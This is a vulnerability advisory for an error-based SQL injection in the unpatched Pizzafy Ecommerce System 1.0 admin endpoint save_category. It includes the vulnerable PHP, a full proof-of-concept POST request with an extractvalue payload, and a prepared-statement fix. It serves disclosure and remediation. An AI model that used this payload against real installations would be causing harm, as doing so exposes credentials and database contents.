
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `pizzafy/admin/ajax.php?action=save_category`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `name` parameter and `name` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
function save_category(){
		extract($_POST);
		$data = " name = '$name' ";
		if(empty($id)){
			$save = $this->conn->query("INSERT INTO category_list set ".$data);
		}else{
			$save = $this->conn->query("UPDATE category_list set ".$data." where id=".$id);
		}
		if($save) {
			return 1;
        } else {
            return $this->conn->error;
        }
	}
```

Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  

```
POST /pizzafy/admin/ajax.php?action=save_category HTTP/1.1
Host: localhost
Content-Length: 286
sec-ch-ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/admin/index.php?page=categories
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=cibugvssqjpg73n0grv4fbg9lf
Connection: close

------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H
Content-Disposition: form-data; name="name"

name: test10' OR extractvalue(1, concat(0x7e, version())) -- 
------WebKitFormBoundaryb6Y1dJ7qqPcyPe2H--
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
------WebKitFormBoundaryTgJxQBXajmMnccmX
Content-Disposition: form-data; name="name"

name: test10' OR extractvalue(1, concat(0x7e, version())) --
------WebKitFormBoundaryTgJxQBXajmMnccmX--
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/GeJZUb2.png)
---

## Remediation
```php
function save_category(){
 
    $id = isset($_POST['id']) ? (int)$_POST['id'] : 0;
    $name = isset($_POST['name']) ? trim($_POST['name']) : '';
    
 
    if(empty($name)) {
        return "Name is necessary.";
    }
    
 
    if(empty($id)){
        $stmt = $this->conn->prepare("INSERT INTO category_list (name) VALUES (?)");
        $stmt->bind_param("s", $name);
    } else {
        $stmt = $this->conn->prepare("UPDATE category_list SET name = ? WHERE id = ?");
        $stmt->bind_param("si", $name, $id);
    }
    
    if($stmt->execute()){
        return 1;
    } else {
        error_log("Error to salve category: " . $stmt->error);
        return 0;
    }
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `name` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
